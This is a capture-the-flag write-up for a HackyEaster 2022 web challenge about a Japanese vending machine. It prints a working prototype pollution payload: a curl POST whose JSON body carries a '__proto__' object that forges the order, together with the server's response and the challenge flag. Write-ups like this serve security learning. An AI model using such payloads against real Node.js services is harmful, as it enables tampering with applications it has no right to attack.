---
layout: writeup

title: 自動販売機
level: 6         # optional, for events that use levels (like HackyEaster)
difficulty: medium    # easy/medium/hard etc, if applicable
points: 200        # if used
categories: [web]  # e.g. crypto, pwn, reversing
tags: [prototype pollution]        # anything notable about challenge/solution, vuln/tools/etc

flag: he2022{p0llut10n_41nt_g00d}

---

## Challenge

I like these Japanese vending machines! ๑(◕‿◕)๑

If I could just get a 🚩...

http://46.101.107.117:2210


## Solution

Based on some chatter in discord, we used the attack described here: [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

```bash
$ curl --silent 'http://46.101.107.117:2210/order' -X POST -H 'Content-Type: application/json' --data-raw '{"__proto__": {"amount": 6, "item": "🚩"}}'
お楽しみください 🚩: he2022{p0llut10n_41nt_g00d}%
```

